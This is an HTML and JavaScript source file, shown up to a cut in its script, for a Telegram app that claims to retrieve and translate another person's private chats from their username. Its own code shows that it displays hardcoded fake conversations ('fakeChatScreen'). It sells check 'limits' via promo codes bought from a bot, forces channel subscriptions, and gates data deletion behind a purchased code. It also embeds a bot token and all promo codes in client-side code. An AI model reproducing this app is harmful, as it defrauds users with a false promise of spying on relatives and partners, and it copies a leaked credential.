<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification Application</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f3f4f6; color: #333; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
        .error { color: red; font-weight: bold; }
        .success { color: green; font-weight: bold; }
        .hidden { display: none; }
        .btn { transition: background-color 0.3s; }
        .btn:hover { opacity: 0.9; }
        select { color: #333; }
        @media (max-width: 640px) {
            .container { padding: 10px; }
            input, button, select { font-size: 16px; }
        }
        body.dark { background-color: #333; color: #f3f4f6; }
        body.dark .container { background-color: #444; }
        body.dark .btn { background-color: #555; }
        body.dark .error { color: #ff6666; }
        body.dark .success { color: #66ff66; }
        body.dark select { color: #f3f4f6; background-color: #555; }
        body.dark input { background-color: #555; color: #f3f4f6; border-color: #666; }
    </style>
</head>
<body>
    <div class="container bg-white rounded-lg shadow-lg p-6">
        <!-- Экран 1: Ввод Telegram ID -->
        <div id="screen1" class="screen">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-2xl font-bold" data-translate="enterTelegramId">Enter Telegram ID</h2>
                <button onclick="showSettings('screen1')" class="bg-gray-500 text-white p-2 rounded btn"><i class="fa-solid fa-gear"></i></button>
            </div>
            <p class="text-center mb-4" data-translate="findTelegramId" style="color: rgb(255, 0, 0); font-weight: 900;">You can find out your telegram id here: <a href="https://t.me/my_id_bot" style="color:blue;">@my_id_bot</a></p>
            <input id="telegramId" type="number" placeholder="Your Telegram ID" class="w-full p-2 mb-4 border rounded" onkeypress="return /^[0-9-s-l\- ]$/.test(event.key)" data-translate-placeholder="telegramIdPlaceholder">
            <button id="submitButton" onclick="submitTelegramId()" class="w-full bg-blue-500 text-white p-2 rounded btn" data-translate="submit">Submit</button>
            <div id="codeInput" class="hidden mt-4">
                <p class="mb-2" data-translate="enterCode">Enter the 6-digit code sent to you here: </p><p><a href="https://t.me/MessageCR_bot" style="color:blue;">@MessageCR_bot</a></p>
                <input id="verificationCode" type="text" placeholder="6-digit code" maxlength="6" class="w-full p-2 mb-4 border rounded">
                <button onclick="verifyCode()" class="w-full bg-blue-500 text-white p-2 rounded btn" data-translate="verify">Verify</button>
            </div>
            <p id="error1" class="error hidden mt-2"></p>
        </div>

        <!-- Экран 2: Подписка на каналы -->
        <div id="screen2" class="screen hidden">
            <h2 class="text-2xl font-bold mb-4 text-center" data-translate="subscribeToChannels">Subscribe to Channels</h2>
            <p id="subscriptionMessage" class="mb-4 text-center" data-translate="pleaseSubscribe">Please subscribe to the following channels:</p>
            <a href="https://t.me/NickNaymes2Bot" target="_blank" class="block bg-blue-500 text-white p-2 mb-2 rounded text-center btn" data-translate="subscribeToNickNaymes2Bot">Subscribe to @NickNaymes2Bot</a>
            <a href="https://t.me/messagesibotnews" target="_blank" class="block bg-blue-500 text-white p-2 mb-4 rounded text-center btn" data-translate="subscribeToMessagesibotnews">Subscribe to @messagesibotnews</a>
            <button onclick="checkSubscriptions()" class="w-full bg-green-500 text-white p-2 rounded btn" data-translate="checkSubscription">Check Subscription</button>
            <button onclick="showScreen('screen1')" class="w-full bg-gray-500 text-white p-2 rounded btn mt-2" data-translate="backToIdInput">Back to ID Input Screen</button>
            <p id="error2" class="error hidden mt-2"></p>
        </div>

        <!-- Экран 3: Главное меню -->
        <div id="screen3" class="screen hidden">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-2xl font-bold" data-translate="mainMenu">Main Menu</h2>
                <button onclick="showSettings('screen3')" class="bg-gray-500 text-white p-2 rounded btn"><i class="fa-solid fa-gear"></i></button>
            </div>
            <p class="mb-4 text-center">
                <span data-translate="currentLimits">Current Limits: </span>
                <span id="limitCount">0</span>
            </p>
            <button onclick="startProcess()" class="w-full bg-blue-500 text-white p-2 mb-2 rounded btn" data-translate="start">Start</button>
            <button onclick="showPromoScreen()" class="w-full bg-purple-500 text-white p-2 rounded btn" data-translate="topUpLimits">Top Up Limits</button>
        </div>

        <!-- Экран ввода username -->
        <div id="usernameScreen" class="screen hidden">
            <h2 class="text-2xl font-bold mb-4 text-center" data-translate="enterUsername">Enter Username</h2>
            <input id="usernameInput" type="text" placeholder="@username" class="w-full p-2 mb-4 border rounded" onkeypress="return /[a-zA-Z0-9-@]/.test(event.key)">
            <button onclick="submitUsername()" class="w-full bg-blue-500 text-white p-2 mb-2 rounded btn" data-translate="next">Next</button>
            <button onclick="backToMain()" class="w-full bg-gray-500 text-white p-2 rounded btn" data-translate="back">Back</button>
            <p id="errorUsername" class="error hidden mt-2"></p>
        </div>

        <!-- Экран выбора пола -->
        <div id="genderScreen" class="screen hidden">
            <h2 class="text-2xl font-bold mb-4 text-center" data-translate="selectGender">Select Gender of <span id="usernameDisplay"></span></h2>
            <button onclick="selectGender('male')" class="w-full bg-blue-500 text-white p-2 mb-2 rounded btn" data-translate="male">Male</button>
            <button onclick="selectGender('female')" class="w-full bg-pink-500 text-white p-2 mb-2 rounded btn" data-translate="female">Female</button>
            <button onclick="backToUsername()" class="w-full bg-gray-500 text-white p-2 rounded btn" data-translate="back">Back</button>
        </div>

        <!-- Экран загрузки -->
        <div id="loadingScreen" class="screen hidden">
            <h2 id="loadingText" class="text-2xl font-bold mb-4 text-center">Loading...</h2>
            <div id="preloadBar" class="w-full bg-gray-200 h-2 mt-4">
                <div id="preloadProgress" class="bg-blue-500 h-2" style="width: 0%"></div>
            </div>
            <p id="preloadText" class="text-center mt-2">0%</p>
        </div>

        <!-- Экран выбора чата -->
        <div id="chatScreen" class="screen hidden">
            <h2 class="text-2xl font-bold mb-4 text-center" data-translate="selectChat">Select Chat</h2>
            <div id="chatButtons" class="mb-4"></div>
            <button onclick="backToMain()" class="w-full bg-blue-500 text-white p-2 rounded btn" data-translate="mainMenu">Main Menu</button>
        </div>

        <!-- Экран фейковой переписки -->
        <div id="fakeChatScreen" class="screen hidden">
            <h2 class="text-2xl font-bold mb-4 text-center" data-translate="fakeChat">The correspondence that I managed to find and translate into English:</h2>
            <div id="fakeChatContent" class="mb-4 p-4 border rounded"></div>
            <button onclick="backToChats()" class="w-full bg-gray-500 text-white p-2 mb-2 rounded btn" data-translate="back">Back</button>
            <button onclick="backToMain()" class="w-full bg-blue-500 text-white p-2 rounded btn" data-translate="mainMenu">Main Menu</button>
        </div>

        <!-- Экран ввода промокода -->
        <div id="promoScreen" class="screen hidden">
            <h2 class="text-2xl font-bold mb-4 text-center" data-translate="enterPromoCode">Enter Promo Code</h2>
            <input id="promoCode" type="text" placeholder="..." class="w-full p-2 mb-4 border rounded">
            <h4 class="mb-4 text-center">
                <a href="https://t.me/Clickerstart_bot" target="_blank" class="text-blue-500" data-translate="buyPromoCodes">Promo codes can be purchased at @Clickerstart_bot</a>
            </h4>
            <button onclick="submitPromoCode()" class="w-full bg-blue-500 text-white p-2 mb-2 rounded btn" data-translate="submit">Submit</button>
            <button onclick="backToMain()" class="w-full bg-gray-500 text-white p-2 rounded btn" data-translate="mainMenu">Main Menu</button>
            <p class="mt-4 text-center">
                <span data-translate="promoCodesEntered">Promo Codes Entered: </span>
                <span id="promoCodeCount">0</span>
            </p>
            <p class="mb-4 text-center">
                <span data-translate="limitsFromPromos">Limits from Promos: </span>
                <span id="limitsFromPromos">0</span>
            </p>
            <p id="promoMessage" class="mt-2"></p>
        </div>

        <!-- Экран отсутствия лимитов -->
        <div id="noLimitsScreen" class="screen hidden">
            <h2 class="text-2xl font-bold mb-4 text-center" data-translate="noLimitsAvailable">No Limits Available</h2>
            <p class="mb-4 text-center" data-translate="pleaseTopUp">You have no limits left. Please top up.</p>
            <button onclick="backToMain()" class="w-full bg-gray-500 text-white p-2 rounded btn" data-translate="backToMainMenu">Back to Main Menu</button>
        </div>

        <!-- Экран настроек -->
        <div id="settingsScreen" class="screen hidden">
            <h2 class="text-2xl font-bold mb-4 text-center" data-translate="settings">Settings</h2>
            <div class="mb-4">
                <label class="block mb-2" data-translate="theme" style="font-weight: bold;">Theme:</label>
                <select id="themeSelect" class="w-full p-2 border rounded">
                    <option value="light" data-translate="light" >Light</option>
                    <option value="dark" data-translate="dark">Dark</option>
                </select>
            </div>
            <div class="mb-4">
                <label class="block mb-2" data-translate="language" style="font-weight: bold;">Language:</label>
                <select id="languageSelect" class="w-full p-2 border rounded">
                    <option value="en" data-translate="english">English</option>
                    <option value="ru" data-translate="russian" selected>Russian</option>
                </select>
            </div>
            <button onclick="showDeleteDataScreen()" class="w-full bg-red-500 text-white p-2 mb-2 rounded btn" data-translate="requestDataDeletion">Request Data Deletion</button>
            <button onclick="applySettings()" class="w-full bg-blue-500 text-white p-2 mb-2 rounded btn" data-translate="apply">Apply</button>
            <button onclick="showScreen(previousScreen)" class="w-full bg-gray-500 text-white p-2 rounded btn" data-translate="back">Back</button>
        </div>

        <!-- Экран запроса на удаление данных -->
        <div id="deleteDataScreen" class="screen hidden">
            <h2 class="text-2xl font-bold mb-4 text-center" data-translate="requestDataDeletion">Request Data Deletion</h2>
            <h4 class="mb-4 text-center" data-translate="enterDeletionCode">Enter the code to delete data</h4>
            <input id="deletionCode" type="text" placeholder="" data-translate-placeholder="deletionCodePlaceholder" class="w-full p-2 mb-4 border rounded">
            <h4 class="mb-4 text-center">
                <a href="https://t.me/Clickerstart_bot" target="_blank" class="text-blue-500" data-translate="getDeletionCode">You can get the deletion code from @Clickerstart_bot</a>
            </h4>
            <button onclick="submitDeletionCode()" class="w-full bg-red-500 text-white p-2 mb-2 rounded btn" data-translate="submit">Submit</button>
            <button onclick="backToSettings()" class="w-full bg-gray-500 text-white p-2 rounded btn" data-translate="back">Back</button>
            <p id="errorDeletion" class="error hidden mt-2"></p>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7511624014:AAG9f_M4x9T8CQht5pT5zAu8e_5fRUao7m4';
        const CHANNELS = ['@NickNaymes2Bot', '@messagesibotnews'];
        const CHAT_OPTIONS = ['mom', 'dad', 'brother', 'sister', 'lovedOne'];

        const PROMO_CODES = [
            { code: 'TEST123', limits: 1 },
            { code: 'HGJKL89', limits: 3 },
            { code: 'IAMTOP', limits: 4 },
            { code: 'MYNEWYEAR', limits: 5 },
            { code: 'READERBOT22ARE23', limits: 8 },
            { code: 'B7J3V9', limits: 11 },
            { code: 'XQ4D8', limits: 12 },
            { code: 'K9V7YPZ6', limits: 13 },
            { code: 'JZ2R', limits: 14 },
            { code: 'F6B3V1H8L7M9Z0P', limits: 18 },
            { code: 'R9J3K2B8C4D1L6X7T', limits: 20 },
            { code: 'Q0T2X7M6P1A3D5V9L', limits: 22 },
            { code: 'S3A8Z9F1B7K0V2J6Y', limits: 24 },
            { code: 'M6W1V8P9G2N3A4L0T', limits: 28 },
            { code: 'C4D1Q9A6B7V5N2LZ', limits: 30 },
            { code: 'L3T7X2B0J8Q1H9ZK', limits: 33 },
            { code: 'P2S9X5F1V3R8K0YJ', limits: 34 },
            { code: 'M6W1V8P9G2N3A4L0T', limits: 37 },
            { code: 'T4B3I7Q0S9F1V2R6X', limits: 40 },
            { code: 'N4M7T9L8G5P1R3W2V', limits: 50 },
            { code: 'Z3A7B1K', limits: 1 },
            { code: 'N6D4J2M9', limits: 3 },
            { code: 'P0L9G8I', limits: 4 },
            { code: 'V1Y3U5O', limits: 5 },
            { code: 'W7T2D4F3G9J1', limits: 8 },
            { code: 'A2Q9V7Z', limits: 11 },
            { code: 'H4J1X3M', limits: 12 },
            { code: 'K8V0P2Y6S', limits: 13 },
            { code: 'B9Z1R4', limits: 14 },
            { code: 'Y6L2T5F9D0N3P', limits: 18 },
            { code: 'U1C8J7W5L9B4Z0T', limits: 20 },
            { code: 'Q9V2X3T5J7P0L1N8', limits: 22 },
            { code: 'C6W3V7B5F1Y9Z0T', limits: 24 },
            { code: 'R4M2P8G1N9A3K0L', limits: 28 },
            { code: 'X5S1V7B9N0P4L2K', limits: 30 },
            { code: 'W3T0X2F1J9Y8M7K', limits: 33 },
            { code: 'T7V0R4K2S1P8Y5J', limits: 34 },
            { code: 'P3S0M2A6T7L1N8V', limits: 37 },
            { code: 'F9R4T2X3S1V0I7B', limits: 40 },
            { code: 'Z8N2L3T0V7P5R1W', limits: 50 },
            { code: 'R8V1Z0', limits: 1 },
            { code: 'D4K2J7L', limits: 3 },
            { code: 'U5B9A2T', limits: 4 },
            { code: 'Q1S3M7P', limits: 5 },
            { code: 'F6V4W2G8Z1P', limits: 8 },
            { code: 'N9L7R2X', limits: 11 },
            { code: 'H3T0Y8J', limits: 12 },
            { code: 'L4Z9M1V6', limits: 13 },
            { code: 'P2C5K0R', limits: 14 },
            { code: 'T7J9F0A3Y8L1N', limits: 18 },
            { code: 'B5C6V7K9L1P0R', limits: 20 },
            { code: 'M3X1Y2F9N5T8V0J', limits: 22 },
            { code: 'S4W8V7B2T1R6L0Z', limits: 24 },
            { code: 'P1A6G9L7F2X0T4N', limits: 28 },
            { code: 'C9R2M5N8Y4P3V7B', limits: 30 },
            { code: 'K6V1X3W9J2Y8L0R', limits: 33 },
            { code: 'S7T4V0Y2P1K9R6X', limits: 34 },
            { code: 'L5B9S3M2T0R8V1N', limits: 37 },
            { code: 'J2X9R4T5S0V7P1F', limits: 40 },
            { code: 'N4T8L1P3V9G7W0R', limits: 50 }
        ];

        let userData = JSON.parse(localStorage.getItem('userData')) || {
            telegramId: null,
            verified: false,
            limits: 1,
            usedUsernames: [],
            usedPromoCodes: [],
            promoCodeCount: 0,
            totalLimitsFromPromos: 0,
            theme: 'light',
            language: 'ru',
            selectedChatOptions: null,
            chatMessages: {},
            firstLogin: new Date().toISOString(),
            lastActivity: new Date().toISOString(),
            totalChatsViewed: 0
        };

        if (typeof userData.limits !== 'number' || userData.limits < 0) {
            userData.limits = 0;
        }

        if (!userData.firstLogin) {
            userData.firstLogin = new Date().toISOString();
        }

        userData.lastActivity = new Date().toISOString();

        const translations = {
            en: {
                enterTelegramId: 'Enter your Telegram ID',
                submit: 'Submit',
                resend: 'Resend',
                enterCode: 'Enter the 6-digit code sent to you here: ',
                verify: 'Verify',
                subscribeToChannels: 'Subscribe to Channels',
                pleaseSubscribe: 'Please subscribe to the following channels:',
                subscribeToNickNaymes2Bot: 'Subscribe to @NickNaymes2Bot',
                subscribeToMessagesibotnews: 'Subscribe to @messagesibotnews',
                checkSubscription: 'Check Subscription',
                backToIdInput: 'Back to ID Input Screen',
                mainMenu: 'Main Menu',
                settings: 'Settings',
                currentLimits: 'Current Limits: ',
                start: 'Start',
                topUpLimits: 'Top Up Limits',
                enterUsername: 'Enter Username',
                next: 'Next',
                back: 'Back',
                selectGender: 'Select Gender of ',
                male: 'Male',
                female: 'Female',
                loading: 'Loading...',
                translating: 'Translating into English...',
                displaying: 'Displaying found chats and messages...',
                selectChat: 'Select Chat',
                fakeChat: 'The correspondence that I managed to find and translate into English:',
                enterPromoCode: 'Enter Promo Code',
                buyPromoCodes: 'Promo codes can be purchased at @Clickerstart_bot',
                noLimitsAvailable: 'No Limits Available',
                pleaseTopUp: 'You have no limits left. Please top up.',
                backToMainMenu: 'Back to Main Menu',
                theme: 'Theme',
                language: 'Language',
                light: 'Light',
                dark: 'Dark',
                english: 'English',
                russian: 'Русский',
                apply: 'Apply',
                invalidUsername: 'Invalid username!',
                usernameAlreadyUsed: 'This username has already been checked',
                invalidCode: 'Invalid code',
                invalidPromoCode: 'Invalid promo code!',
                promoCodeAlreadyUsed: 'This promo code has already been used!',
                success: 'Success!',
                mom: 'Mom',
                dad: 'Dad',
                brother: 'Brother',
                sister: 'Sister',
                lovedOne: 'Loved One',
                lovedOneMale: 'Beloved',
                lovedOneFemale: 'Beloved',
                youCantCheckSamePerson: 'You can\'t check the same person multiple times!',
                promoCodesEntered: 'Promo Codes Entered: ',
                limitsFromPromos: 'Limits from Promos: ',
                requestDataDeletion: 'Request Data Deletion',
                enterDeletionCode: 'Enter the code to delete data',
                deletionCodeIncorrect: 'Invalid code!',
                getDeletionCode: 'You can get the deletion code from @Clickerstart_bot',
                deletionCodePlaceholder: 'Deletion code',
                findTelegramId: 'You can find out your telegram id here: <a href="https://t.me/my_id_bot" style="color:blue;">@my_id_bot</a>',
                telegramIdPlaceholder: 'Your Telegram ID',
                momConversations: [
                    ["Hi Mom!", "Hi sweetie! How are you today?"],
                    ["Mom, can I go out for a walk?", "Where would you like to go?", "To the park with friends.", "Do you want me to pick you up later?"],
                    ["Mom, I got an A in math!", "Well done! Should we celebrate?", "Yes, let's get a cake!"],
                    ["Mom, I have a test tomorrow, can you help me study?", "Of course, let's solve problems together.", "Thanks! You're the best."],
                    ["Mom, I'll be late from work, don't wait for dinner.", "Okay, just call when you're free.", "I will definitely call."],
                    ["Mom, did you pick up the package?", "Yes, it's on the kitchen table.", "Thanks, I'll check it tonight."],
                    ["Mom, I need your opinion: which jacket should I choose?", "Show me a photo, I'll help you decide.", "Sent it, which one is better?"],
                    ["Mom, I'm tired, I had a lot of classes today.", "Rest, I'll make tea and cookies.", "Thanks, that's exactly what I need."]
                ],
                dadConversations: [
                    ["Dad, how are you?", "I'm fine, son.", "What are you doing?", "Watching TV."],
                    ["Dad, can you help with the car?", "Sure, what's the problem?", "The engine won't start.", "Let's check the battery and starter."],
                    ["Dad, recommend a movie for tonight.", "Watch the new thriller, it has great reviews.", "Okay, thanks for the recommendation!"],
                    ["Dad, I won the chess tournament!", "Congratulations! You did great.", "Couldn't have done it without your lessons."],
                    ["Dad, can I borrow your tools?", "Sure, but be careful.", "I promise I'll return them clean."],
                    ["Dad, any plans for the weekend?", "Thinking of going fishing.", "Can I come with you?", "Let's take the rods and go together!"],
                    ["Dad, I bought a gift for Mom.", "Great idea, she'll be happy.", "I hope she likes it."],
                    ["Dad, tell me about your youth.", "When I was your age, we used to play outside..."]
                ],
                brotherConversations: [
                    ["Hey bro!", "Hey! How's it going?", "Great, and you?"],
                    ["Bro, can I borrow your headphones?", "Sure, just take care of them.", "I promise."],
                    ["Bro, play soccer tonight?", "Let's do it, what time?", "At seven by the school field."],
                    ["Bro, help me move my chair.", "No problem, let's lift together.", "Thanks!"],
                    ["Bro, have you seen my backpack?", "Yes, you left it in the hallway.", "Found it, thanks."],
                    ["Bro, what are your plans for the holidays?", "I want to go to my friends' cottage.", "Sounds awesome."],
                    ["Bro, can I use your laptop?", "Okay, but don't install extra software.", "Got it."],
                    ["Bro, remember our game?", "Of course, I still hold the record.", "Let's play again!"]
                ],
                sisterConversations: [
                    ["Sis, are you home?", "Yes, I just got back.", "What's new?"],
                    ["Sis, can I borrow your dress for prom?", "Sure, try it on.", "Thanks!"],
                    ["Sis, can you help me with my hair?", "Gladly.", "You're the best stylist."],
                    ["Sis, want to go shopping together?", "Let's go, I want a new bag.", "Great."],
                    ["Sis, what are your plans for tonight?", "I'll be reading a book.", "Maybe we'll watch a movie together?", "Let's do it!"],
                    ["Sis, did you finish the English homework?", "Yes, I checked with the tutor.", "Can you show me my mistakes?"],
                    ["Sis, heard the news?", "Which one?", "They announced a school concert.", "We should participate!"],
                    ["Sis, happy birthday!", "Thanks, you're the best brother." ]
                ],
                lovedOneMaleConversations: [
                    ["Hi darling!", "Hi my love! How was your day?"],
                    ["Honey, I miss you.", "I miss you too. Shall we call tonight?"],
                    ["Sweetheart, what do you want for dinner?", "Your salad and pasta.", "I'll cook with pleasure."],
                    ["I love you.", "I love you more than anything."],
                    ["How did your meeting go?", "It went well, I'll tell you soon.", "Looking forward to it."],
                    ["Darling, shall we travel?", "I want to go to the sea.", "Let's plan a trip."],
                    ["Love, did you see my photos?", "Yes, you look stunning.", "Thanks!"],
                    ["I'm so happy we're together.", "And I'm happy every day with you."]
                ],
                lovedOneFemaleConversations: [
                    ["Hi sweetheart!", "Hi darling! How was your day?"],
                    ["Babe, I miss you.", "I miss you too. When will we meet?"],
                    ["Sweetheart, what shall we watch tonight?", "Let's watch a comedy.", "Great, I'll order popcorn."],
                    ["I adore you.", "I adore you with all my heart."],
                    ["How did your presentation go?", "It was successful, waiting for your praise.", "Well done!"],
                    ["Babe, shall we go to the mountains this weekend?", "I want fresh air.", "Let's plan the trip."],
                    ["Love, did you see the new clothes?", "Yes, I want to try them on.", "Let's go shopping together."],
                    ["I'm happy with you.", "And I'm happy to be with you."]
                ]
            },
            ru: {
                enterTelegramId: 'Введите свой ID Telegram',
                submit: 'Отправить',
                resend: 'Отправить заново',
                enterCode: 'Введите 6-значный код, отправленный в ',
                verify: 'Проверить',
                subscribeToChannels: 'Подпишитесь на каналы',
                pleaseSubscribe: 'Пожалуйста, подпишитесь на следующие каналы:',
                subscribeToNickNaymes2Bot: 'Подписаться на @NickNaymes2Bot',
                subscribeToMessagesibotnews: 'Подписаться на @messagesibotnews',
                checkSubscription: 'Проверить подписку',
                backToIdInput: 'Вернуться к экрану ввода ID',
                mainMenu: 'Главное меню',
                settings: 'Настройки',
                currentLimits: 'Текущие лимиты: ',
                start: 'Начать',
                topUpLimits: 'Пополнить лимиты',
                enterUsername: 'Введите имя пользователя',
                next: 'Далее',
                back: 'Назад',
                selectGender: 'Выберите пол ',
                male: 'Мужской',
                female: 'Женский',
                loading: 'Загрузка...',
                translating: 'Перевожу на русский...',
                displaying: 'Вывожу найденные чаты и переписки...',
                selectChat: 'Выберите чат',
                fakeChat: 'Переписка, которую мне удалось найти и перевести на русский:',
                enterPromoCode: 'Введите промокод',
                buyPromoCodes: 'Промокоды можно приобрести у @Clickerstart_bot',
                noLimitsAvailable: 'Лимиты недоступны',
                pleaseTopUp: 'У вас не осталось лимитов. Пожалуйста, пополните.',
                backToMainMenu: 'Вернуться в главное меню',
                theme: 'Тема',
                language: 'Язык',
                light: 'Светлая',
                dark: 'Темная',
                english: 'English',
                russian: 'Русский',
                apply: 'Применить',
                invalidUsername: 'Неверный username!',
                usernameAlreadyUsed: 'Это имя пользователя уже было проверено',
                invalidCode: 'Неверный код',
                invalidPromoCode: 'Неверный промокод!',
                promoCodeAlreadyUsed: 'Этот промокод уже был использован!',
                success: 'Успех!',
                mom: 'Мама',
                dad: 'Папа',
                brother: 'Брат',
                sister: 'Сестра',
                lovedOne: 'Любимый человек',
                lovedOneMale: 'Любимая',
                lovedOneFemale: 'Любимый',
                youCantCheckSamePerson: 'Нельзя проверять одного и того же человека несколько раз!',
                promoCodesEntered: 'Введено промокодов: ',
                limitsFromPromos: 'Получено лимитов от промокодов: ',
                requestDataDeletion: 'Запрос на удаление данных',
                enterDeletionCode: 'Введите код для удаления данных',
                deletionCodeIncorrect: 'Неверный код!',
                getDeletionCode: 'Код удаления можно взять у @Clickerstart_bot',
                deletionCodePlaceholder: 'Код удаления',
                findTelegramId: 'Вы можете узнать свой ID Telegram здесь: <a href="https://t.me/my_id_bot" style="color:blue;">@my_id_bot</a>',
                telegramIdPlaceholder: 'Ваш Telegram ID',
                momConversations: [
                    ["Привет, мама!", "Привет, дорогой! Как твои дела сегодня?"],
                    ["Мам, можно я пойду гулять?", "Куда хочешь?", "В парк с друзьями.", "Хочешь, я заеду за тобой позже?"],
                    ["Мама, я получил пятёрку по математике!", "Вот молодец! Отмечаем?", "Да, купим торт!"],
                    ["Мам, у меня завтра контрольная, поможешь подготовиться?", "Конечно, давай вместе решим задачи.", "Спасибо! Ты лучшая."],
                    ["Мама, я задержусь на работе, не жди ужин.", "Хорошо, только позвони, когда освободишься.", "Обязательно позвоню."],
                    ["Мам, ты забрала посылку?", "Да, лежит на кухне.", "Спасибо, посмотрю вечером."],
                    ["Мама, мне нужно твое мнение: какую куртку выбрать?", "Покажи фото, я помогу выбрать.", "Отправил, какая лучше?"],
                    ["Мама, я устал, сегодня было много занятий.", "Отдохни, я приготовлю чай и печенье.", "Спасибо, это именно то, что нужно."]
                ],
                dadConversations: [
                    ["Пап, как дела?", "Нормально, сынок.", "Что делаешь?", "Смотрю телевизор."],
                    ["Пап, можешь помочь с машиной?", "Конечно, что случилось?", "Не заводится двигатель.", "Проверим аккумулятор и стартер."],
                    ["Пап, посоветуй фильм на вечер.", "Посмотри новый триллер, там отличные отзывы.", "Хорошо, спасибо за рекомендацию!"],
                    ["Пап, я выиграл соревнование по шахматам!", "Поздравляю! Ты молодец.", "Без твоих уроков не справился бы."],
                    ["Пап, могу я взять твой инструмент?", "Конечно, но будь осторожен.", "Обещаю, верну чистым."],
                    ["Пап, какие планы на выходные?", "Думаю поехать на рыбалку.", "Можно я с тобой?", "Берём удочки и едем вместе!"],
                    ["Пап, я купил подарок для мамы.", "Отличная идея, она будет рада.", "Надеюсь, ей понравится."],
                    ["Пап, расскажи про свою молодость.", "Когда я был в твоем возрасте, мы играли на улице..."]
                ],
                brotherConversations: [
                    ["Привет, брат!", "Привет! Как дела?", "Отлично, а у тебя?"],
                    ["Брат, одолжишь наушники?", "Конечно, только береги их.", "Обещаю."],
                    ["Брат, играть в футбол вечером?", "Давай, во сколько?", "В семь под школьным стадионом."],
                    ["Брат, помоги с переездом моего стула.", "Без проблем, поднимем вместе.", "Спасибо!"],
                    ["Брат, ты видел мой рюкзак?", "Да, оставил его в коридоре.", "Нашел, спасибо."],
                    ["Брат, какие у тебя планы на каникулы?", "Хочу поехать к друзьям на дачу.", "Звучит здорово."],
                    ["Брат, можно я воспользуюсь твоим ноутом?", "Ладно, но не устанавливай лишнего софта.", "Понял."],
                    ["Брат, помнишь нашу игру?", "Конечно, до сих пор держу рекорд.", "Давай сыграем снова!"]
                ],
                sisterConversations: [
                    ["Сестра, ты дома?", "Да, только пришла.", "Что нового?"],
                    ["Сестра, одолжи платье на выпускной?", "Конечно, примеряй.", "Спасибо!"],
                    ["Сестра, можешь помочь с прической?", "С удовольствием.", "Ты лучшая стилистка."],
                    ["Сестра, поедем вместе за покупками?", "Давай, хочу новую сумку.", "Отлично."],
                    ["Сестра, какие у тебя планы на вечер?", "Буду читать книгу.", "Может фильм посмотрим вместе?", "Давай!"],
                    ["Сестра, ты сделала домашку по английскому?", "Да, проверила у репетитора.", "Можешь показать мои ошибки?"],
                    ["Сестра, слышала новость?", "Какую?", "В школе объявили концерт.", "Надо участвовать!"],
                    ["Сестра, поздравляю с днем рождения!", "Спасибо, ты самый лучший брат." ]
                ],
                lovedOneMaleConversations: [
                    ["Привет, любимый!", "Привет, моя хорошая! Как прошел твой день?"],
                    ["Милый, скучаю по тебе.", "И я по тебе. Давай созвонимся вечером?"],
                    ["Любимый, что хочешь на ужин?", "Твой салат и пасту.", "Готовлю с удовольствием."],
                    ["Я тебя люблю.", "Я тоже тебя люблю больше всего на свете."],
                    ["Как прошла твоя встреча?", "Хорошо, скоро расскажу.", "Жду с нетерпением."],
                    ["Милый, поедем в путешествие?", "Хочу на море.", "Давай спланируем маршрут."],
                    ["Любимый, ты видел мои фото?", "Да, ты невероятно красива.", "Спасибо!"],
                    ["Я так рада, что мы вместе.", "И я счастлив каждый день с тобой."]
                ],
                lovedOneFemaleConversations: [
                    ["Привет, любимая!", "Привет, дорогой! Как твой день?"],
                    ["Милая, скучаю по тебе.", "И я по тебе. Когда увидимся?"],
                    ["Любимая, что будем смотреть вечером?", "Давай комедию.", "Отлично, закажу попкорн."],
                    ["Я тебя обожаю.", "И я тебя обожаю всем сердцем."],
                    ["Как прошла твоя презентация?", "Успешно, жду твоей похвалы.", "Ты молодец!"],
                    ["Милая, поедем на выходные в горы?", "Хочу свежий воздух.", "Спланируем поездку."],
                    ["Любимая, ты видела новую одежду?", "Да, хочу примерить.", "Пойдем вместе в магазин."],
                    ["Я счастлива с тобой.", "И я счастлив быть с тобой."]
                ]
            }
        };

        let previousScreen = null;

        function saveData() {
            localStorage.setItem('userData', JSON.stringify(userData));
        }

        function showScreen(screenId) {
            document.querySelectorAll('.screen').forEach(screen => screen.classList.add('hidden'));
            document.getElementById(screenId).classList.remove('hidden');
            translatePage();
            updateLimitsDisplay();
            updatePromoStatsDisplay();
        }

        function showError(elementId, message) {
            const errorElement = document.getElementById(elementId);
            errorElement.textContent = message;
            errorElement.classList.remove('hidden');
        }

        function clearError(elementId) {
            const errorElement = document.getElementById(elementId);
            errorElement.textContent = '';
            errorElement.classList.add('hidden');
        }

        function updateLimitsDisplay() {
            const limitCountElement = document.getElementById('limitCount');
            if (limitCountElement) {
                limitCountElement.textContent = userData.limits;
            }
        }

        function updatePromoStatsDisplay() {
            const promoCodeCountElement = document.getElementById('promoCodeCount');
            const limitsFromPromosElement = document.getElementById('limitsFromPromos');
            if (promoCodeCountElement) {
                promoCodeCountElement.textContent = userData.promoCodeCount || 0;
            }
            if (limitsFromPromosElement) {
                limitsFromPromosElement.textContent = userData.totalLimitsFromPromos || 0;
            }
        }

        async function submitTelegramId() {
            const telegramId = document.getElementById('telegramId').value.trim();
            if (!telegramId) {
                showError('error1', translations[userData.language].enterTelegramId || 'Please enter Telegram ID');
                return;
            }

            clearError('error1');
            userData.telegramId = telegramId;
            saveData();

            try {
                const code = Math.floor(100000 + Math.random() * 900000);
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: telegramId,
                        text: `Your verification code: ${code}`
                    })
                });

                const result = await response.json();
                if (result.ok) {
                    userData.verificationCode = code;
                    saveData();
                    document.getElementById('codeInput').classList.remove('hidden');
                    const submitButton = document.getElementById('submitButton');
                    submitButton.textContent = translations[userData.language].resend || 'Resend';
                } else {
                    userData.verified = true;
                    saveData();
                    checkSubscriptions(true);
                }
            } catch (error) {
                userData.verified = true;
                saveData();
                checkSubscriptions(true);
            }
        }

